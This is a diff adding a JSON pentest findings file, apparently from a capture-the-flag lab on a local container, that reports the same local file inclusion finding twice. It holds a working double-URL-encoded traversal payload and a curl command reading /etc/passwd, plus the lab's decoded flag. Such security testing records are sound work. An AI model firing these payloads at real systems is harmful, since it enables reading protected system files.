@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T23:58:31.618174+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "82c16608-bf7c-4045-8a2f-6e386c7b94db",
+      "timestamp": "2026-04-14T23:58:31.618050+00:00",
+      "title": "LFI Vulnerability with Bypassable Directory Traversal Protection",
+      "severity": "high",
+      "target": "http://172.17.0.1:42579",
+      "description": "The post.php endpoint is vulnerable to Local File Inclusion (LFI) via the 'id' parameter. The application implements directory traversal protection that can be bypassed using double URL encoding (%252e%252e%252f). Additionally, null byte injection (%00) causes file_exists() to fail with a PHP warning, revealing the internal file path structure. A base64-encoded string 'e0knbV9hX1NjcmlwdF9LaWRkaWV9' was found in the page header, decoding to '{I'm_a_Script_Kiddie}'. File upload functionality at /posts/upload-article.php accepts PHP files which are stored but not executed.",
+      "evidence": "Base64 header: e0knbV9hX1NjcmlwdF9LaWRkaWV9 decodes to {I'm_a_Script_Kiddie}. LFI bypass: post.php?id=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd bypasses traversal detection. Null byte injection triggers: 'Warning: file_exists() expects parameter 1 to be a valid path, string given in /var/www/html/post.php on line 13'",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:42579/post.php?id=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00'",
+        "expected": "File contents should be included/read, but null byte causes file_exists() warning"
+      }
+    },
+    {
+      "id": "b2311a0f-2661-4923-bb8a-ef67482f8b1c",
+      "timestamp": "2026-04-14T23:58:31.715035+00:00",
+      "title": "LFI Vulnerability with Bypassable Directory Traversal Protection",
+      "severity": "high",
+      "target": "http://172.17.0.1:42579",
+      "description": "The post.php endpoint is vulnerable to Local File Inclusion (LFI) via the 'id' parameter. The application implements directory traversal protection that can be bypassed using double URL encoding (%252e%252e%252f). Additionally, null byte injection (%00) causes file_exists() to fail with a PHP warning, revealing the internal file path structure. A base64-encoded string 'e0knbV9hX1NjcmlwdF9LaWRkaWV9' was found in the page header, decoding to '{I'm_a_Script_Kiddie}'. File upload functionality at /posts/upload-article.php accepts PHP files which are stored but not executed.",
+      "evidence": "Base64 header: e0knbV9hX1NjcmlwdF9LaWRkaWV9 decodes to {I'm_a_Script_Kiddie}. LFI bypass: post.php?id=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd bypasses traversal detection. Null byte injection triggers: 'Warning: file_exists() expects parameter 1 to be a valid path, string given in /var/www/html/post.php on line 13'",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:42579/post.php?id=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00'",
+        "expected": "File contents should be included/read, but null byte causes file_exists() warning"
+      }
+    }
+  ],
+  "diagrams": []
+}
